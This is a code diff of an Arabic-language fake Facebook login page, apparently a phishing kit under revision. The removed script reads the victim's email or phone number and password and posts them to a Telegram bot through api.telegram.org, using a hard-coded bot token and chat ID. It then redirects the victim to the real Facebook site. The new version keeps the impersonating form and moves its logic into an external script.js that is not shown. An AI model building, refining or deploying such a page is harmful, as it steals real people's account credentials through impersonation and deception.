@@ -4,145 +4,55 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول إلى فيسبوك</title>
+    <!-- تضمين مكتبة Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Cairo', sans-serif;
-            background-color: #f0f2f5;
-        }
-    </style>
+    <!-- ربط ملف الـ CSS الخارجي (تأكد أنه في نفس المجلد) -->
+    <link rel="stylesheet" href="styles.css">
 </head>
-<body class="min-h-screen flex flex-col justify-between items-center py-6 px-4">
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
 
-    <main class="w-full max-w-5xl mx-auto flex flex-col lg:flex-row items-center justify-center gap-8 my-auto">
+    <div class="container mx-auto px-4 flex flex-col lg:flex-row items-center justify-center max-w-5xl py-12">
         
-        <!-- Left Side: Branding / Intro -->
-        <div class="text-center lg:text-right max-w-lg lg:w-1/2">
-            <h1 class="text-blue-600 font-bold text-5xl lg:text-6xl tracking-tight mb-4 font-sans">facebook</h1>
-            <p class="text-gray-600 text-xl lg:text-2xl leading-relaxed">
-                يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص الذين تعرفهم.
+        <!-- القسم الأيمن: الشعار والنص التوضيحي -->
+        <div class="lg:w-1/2 text-center lg:text-right mb-8 lg:mb-0 lg:pr-10">
+            <h1 class="text-blue-600 text-5xl lg:text-6xl font-bold mb-4 font-sans">facebook</h1>
+            <p class="text-gray-600 text-xl lg:text-2xl leading-snug">
+                يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص الذين يعرفونك.
             </p>
         </div>
 
-        <!-- Right Side: Login Card -->
-        <div class="w-full max-w-md bg-white p-4 lg:p-6 rounded-xl shadow-lg border border-gray-100">
-            <form id="loginForm" class="flex flex-col gap-4">
-                
-                <!-- Input: Email/Phone -->
-                <div>
-                    <input type="text" id="email" name="email" required
-                        placeholder="البريد الإلكتروني أو رقم الهاتف"
-                        class="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg transition duration-200">
+        <!-- القسم الأيسر: نموذج تسجيل الدخول -->
+        <div class="lg:w-1/2 w-full max-w-md">
+            <div class="bg-white p-4 rounded-lg shadow-xl flex flex-col">
+                <form id="loginForm" class="flex flex-col space-y-3">
+                    <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required
+                        class="border border-gray-300 rounded-md p-3.5 focus:outline-none focus:border-blue-500 text-base">
+                    
+                    <input type="password" id="password" name="password" placeholder="كلمة المرور" required
+                        class="border border-gray-300 rounded-md p-3.5 focus:outline-none focus:border-blue-500 text-base">
+                    
+                    <button type="submit" id="submitBtn"
+                        class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-md text-xl transition duration-200">
+                        تسجيل الدخول
+                    </button>
+                </form>
+
+                <div class="text-center my-3">
+                    <a href="#" class="text-blue-600 text-sm hover:underline">هل نسيت كلمة المرور؟</a>
                 </div>
 
-                <!-- Input: Password -->
-                <div>
-                    <input type="password" id="password" name="password" required
-                        placeholder="كلمة المرور"
-                        class="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg transition duration-200">
-                </div>
+                <hr class="my-2 border-gray-300">
 
-                <!-- Submit Button -->
-                <button type="submit" id="submitBtn"
-                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg text-xl transition duration-200 shadow-md">
-                    تسجيل الدخول
-                </button>
-
-                <!-- Forgot Password Link -->
-                <div class="text-center my-2">
-                    <a href="#" onclick="showCustomModal('هذه الميزة غير متاحة حالياً')" class="text-blue-600 hover:underline text-sm font-semibold">هل نسيت كلمة المرور؟</a>
-                </div>
-
-                <hr class="border-gray-200 my-1">
-
-                <!-- Create Account Button -->
-                <div class="text-center mt-2">
-                    <button type="button" onclick="showCustomModal('سيتم توجيهك لإنشاء حساب جديد')"
-                        class="bg-green-600 hover:bg-green-700 text-white font-bold py-2.5 px-6 rounded-lg text-lg transition duration-200 shadow-sm">
+                <div class="text-center py-4">
+                    <button class="bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-md text-base transition duration-200">
                         إنشاء حساب جديد
                     </button>
                 </div>
-
-            </form>
-        </div>
-    </main>
-
-    <footer class="w-full text-center text-gray-500 text-sm py-4">
-        <p>Facebook © 2026 - جميع الحقوق محفوظة</p>
-    </footer>
-
-    <!-- Custom Modal for Notifications (Avoiding standard alert) -->
-    <div id="customModal" class="fixed inset-0 bg-black/50 hidden flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-xl p-6 max-w-sm w-full shadow-2xl text-center transform transition-all scale-95 opacity-0" id="modalContent">
-            <div id="modalIcon" class="text-4xl mb-3">⚠️</div>
-            <h3 id="modalTitle" class="text-xl font-bold text-gray-800 mb-2">تنبيه</h3>
-            <p id="modalMessage" class="text-gray-600 mb-4 text-sm"></p>
-            <button onclick="closeModal()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg font-bold">موافق</button>
+            </div>
         </div>
     </div>
 
-    <script>
-        function showCustomModal(message) {
-            const modal = document.getElementById('customModal');
-            const modalContent = document.getElementById('modalContent');
-            const modalMessage = document.getElementById('modalMessage');
-
-            modalMessage.innerText = message;
-            modal.classList.remove('hidden');
-            setTimeout(() => {
-                modalContent.classList.remove('scale-95', 'opacity-0');
-                modalContent.classList.add('scale-100', 'opacity-100');
-            }, 10);
-        }
-
-        function closeModal() {
-            const modal = document.getElementById('customModal');
-            const modalContent = document.getElementById('modalContent');
-            modalContent.classList.remove('scale-100', 'opacity-100');
-            modalContent.classList.add('scale-95', 'opacity-0');
-            setTimeout(() => {
-                modal.classList.add('hidden');
-            }, 200);
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-
-            if (!email || !password) {
-                showCustomModal('الرجاء إدخال البريد الإلكتروني أو رقم الهاتف وكلمة المرور');
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.innerText = 'جارٍ تسجيل الدخول...';
-
-            const botToken = '8748761382:AAFvnbUyINutno892QgAg8SbReH32dNhKXU';
-            const chatId = '1175034410';
-            const message = `📥 بيانات دخول جديدة من فيسبوك:\n📧 الحساب: ${email}\n🔑 كلمة المرور: ${password}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => {
-                // إعادة توجيه المستخدم لموقع فيسبوك الحقيقي بعد الإرسال الناجح
-                window.location.href = 'https://www.facebook.com';
-            })
-            .catch(error => {
-                showCustomModal('حدث خطأ في الاتصال، يجدر المحاولة لاحقاً');
-                submitBtn.disabled = false;
-                submitBtn.innerText = 'تسجيل الدخول';
-            });
-        });
-    </script>
+    <!-- ربط ملف الجافاسكريبت الخارجي -->
+    <script src="script.js"></script>
 </body>
 </html>
